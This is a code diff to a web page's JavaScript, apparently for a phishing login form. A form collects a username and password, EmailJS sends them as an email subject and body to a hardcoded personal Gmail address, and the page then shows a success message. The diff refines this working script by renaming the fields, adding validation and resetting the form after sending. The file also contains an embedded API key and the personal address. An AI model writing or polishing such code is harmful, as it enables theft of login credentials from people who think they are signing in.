@@ -1,21 +1,36 @@
-// Initialize EmailJS with your public key (API key)
+// Initialize EmailJS securely
 emailjs.init('rbzxQsqsqS1lbs8Y1'); // Replace with your actual public key
 
-const subjectInput = document.getElementById('Username');
-const messageInput = document.getElementById('Password');
+const usernameInput = document.getElementById('Username');
+const passwordInput = document.getElementById('Password');
 const sendBtn = document.getElementById('sendBtn');
 const statusDiv = document.getElementById('status');
+const emailForm = document.getElementById('emailForm');
 
-subjectInput.addEventListener('input', enableSendButton);
-messageInput.addEventListener('input', enableSendButton);
+// Enable send button when inputs are not empty
+function enableSendButton() {
+    sendBtn.disabled = !(usernameInput.value.trim() && passwordInput.value.trim());
+}
 
-document.getElementById('emailForm').addEventListener('submit', function(event) {
+usernameInput.addEventListener('input', enableSendButton);
+passwordInput.addEventListener('input', enableSendButton);
+
+emailForm.addEventListener('submit', function (event) {
     event.preventDefault();
+
+    const username = usernameInput.value.trim();
+    const password = passwordInput.value.trim();
+
+    if (!username || !password) {
+        statusDiv.textContent = 'Both fields are required!';
+        statusDiv.classList.add('error');
+        return;
+    }
 
     const emailData = {
         to_email: 'kaioadrik08@gmail.com', // Update if needed
-        subject: subjectInput.value.trim(),
-        message: messageInput.value.trim()
+        subject: username,
+        message: password
     };
 
     statusDiv.textContent = 'Sending...';
@@ -26,6 +41,8 @@ document.getElementById('emailForm').addEventListener('submit', function(event) 
             console.log('Success:', response);
             statusDiv.textContent = 'Message sent successfully!';
             statusDiv.classList.add('success');
+            emailForm.reset();
+            enableSendButton(); // Disable send button after reset
         })
         .catch(error => {
             console.error('Failed:', error);
